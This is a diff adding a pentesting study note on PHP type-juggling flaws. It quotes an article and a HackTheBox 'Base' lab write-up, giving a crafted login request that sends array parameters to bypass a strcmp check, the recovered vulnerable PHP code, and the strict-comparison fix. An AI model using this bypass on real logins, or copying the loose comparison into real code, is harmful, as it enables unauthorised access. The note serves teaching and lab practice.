@@ -1,0 +1,105 @@
+---
+title: PHP Type Juggling Vulnerabilities 
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - web pentesting
+---
+
+# PHP Type Juggling Vulnerabilities
+
+Read [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09).
+
+Copy-pasted, quoted:
+
+```
+How vulnerability arises
+
+The most common way that this particularity in PHP is exploited is by using it to bypass authentication.
+
+Let’s say the PHP code that handles authentication looks like this:
+
+if ($_POST["password"] == "Admin_Password") {login_as_admin();}
+
+Then, simply submitting an integer input of 0 would successfully log you in as admin, since this will evaluate to True:
+
+(0 == “Admin_Password”) -> True
+```
+
+In the HackTheBox machine Base, login form was bypasseable by entering an empty array into the username and password parameters:
+
+```
+Original request
+
+
+POST /login/login.php HTTP/1.1
+Host: base.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://base.htb
+Connection: close
+Referer: http://base.htb/login/login.php
+Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
+Upgrade-Insecure-Requests: 1
+
+username=admin&password=admin
+
+```
+
+
+```
+Crafted request:
+
+POST /login/login.php HTTP/1.1
+Host: base.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://base.htb
+Connection: close
+Referer: http://base.htb/login/login.php
+Cookie: PHPSESSID=sh4obp53otv54vtsj0g6tev1tt
+Upgrade-Insecure-Requests: 1
+
+username[]=admin&password[]=admin
+```
+
+How to know? By spotting the file login.php.swp in the /login exposed directory and reading its contents with:
+
+```bash
+vim -r login.php.swp
+# -r  -- list swap files and exit or recover from a swap file
+
+```
+
+Content:
+
+```
+<?php
+session_start();
+if (!empty($_POST['username']) && !empty($_POST['password'])) {
+    require('config.php');
+    if (strcmp($username, $_POST['username']) == 0) {
+        if (strcmp($password, $_POST['password']) == 0) {
+            $_SESSION['user_id'] = 1;
+            header("Location: /upload.php");
+        } else {
+            print("<script>alert('Wrong Username or Password')</script>");
+        }
+    } else {
+        print("<script>alert('Wrong Username or Password')</script>");
+    }
+}
+```
+
+
+Quoting from the article [PHP Type Juggling Vulnerabilities](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09): "When comparing values, always try to use the type-safe comparison operator “===” instead of the loose comparison operator “==”. This will ensure that PHP does not type juggle and the operation will only return True if the types of the two variables also match. This means that (7 === “7”) will return False."
+
